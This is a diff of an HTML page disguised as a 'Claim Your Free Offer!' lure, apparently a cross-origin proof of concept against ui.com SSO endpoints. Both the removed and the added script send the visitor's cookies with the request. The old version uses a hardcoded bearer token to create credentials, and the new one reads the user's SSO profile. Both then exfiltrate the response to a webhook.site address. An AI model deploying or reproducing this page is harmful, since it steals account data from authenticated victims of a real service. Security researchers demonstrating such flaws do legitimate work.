@@ -2,32 +2,21 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Claim Your Free Offer!</title>
+  <title>Malicious Script</title>
 </head>
 <body>
   <h1>Claim Your Free Offer!</h1>
-
   <script>
-    var authToken = "fjIwMjIwNjA3fHlKSVMyQWlDYWtqVTB6K01ueFNOWFIvS0FwTUUvM1dhUERLTkxPVEQxNFhXYXNrRmM5ZHdCdy9DWjFvQ3NDR0NkWVh2SEN3WldGc3Z1YmVJemtybjZudGpsRFBrWTllR3RSVWpsNXMwUDh4amxML3hRZkFXMWVvT1BnMWpDS2FYQjl2bVRtNVBaMndnUEZsTG04SjFyV2pzTCthc0VTQlF0aUhTNHRjWEZFUXhkendEMFRNY1dGM1plTlVkU3cwRzczVlA5d0x1QlFMdzB4eVdGdG5rYkpRelBwMGhSdDJieTNnWFpVcFBtM0k0TUZKcnRaTVFXRlpBWDB1V1hOZFB1RHQweGxxVnJ6ZVFkYXRQdUdSblBnNDF2NlhhRlFTQTZKMXc2SEFZeG5HVDBOMUVMT1Ezc2c0TDQzam1nZmlPZlkrZG1MN0V8NFBESGdTVWExeldMTFVENHd2djlaVStzbENNPXxXQnpYQ2hhTHVuYy9HVFMrM09qdG9RPT18c1lYWWJrQXZrdWhRSUx3QW51dDZJNklFUTIwPQ==E"; // Manually add token
-
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('POST', 'https://cloudaccess.svc.ui.com/create-credentials', true);
-    req.setRequestHeader("Authorization", "Bearer " + authToken); // Inject token
-    req.withCredentials = true; // Send cookies too
+    req.open('GET', 'https://sso.ui.com/api/sso/v1/user/self', true);
+    req.withCredentials = true; // Send cookies with the request
     req.send();
-
+    
     function reqListener() {
-      // Exfiltrate response data to attacker's server
-      fetch('https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717', {
-        method: 'POST',
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          response: this.responseText
-        })
-      });
+      // Exfiltrate sensitive data to an external server
+      location = 'https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717?data=' + encodeURIComponent(this.responseText);
     }
   </script>
-
 </body>
 </html>
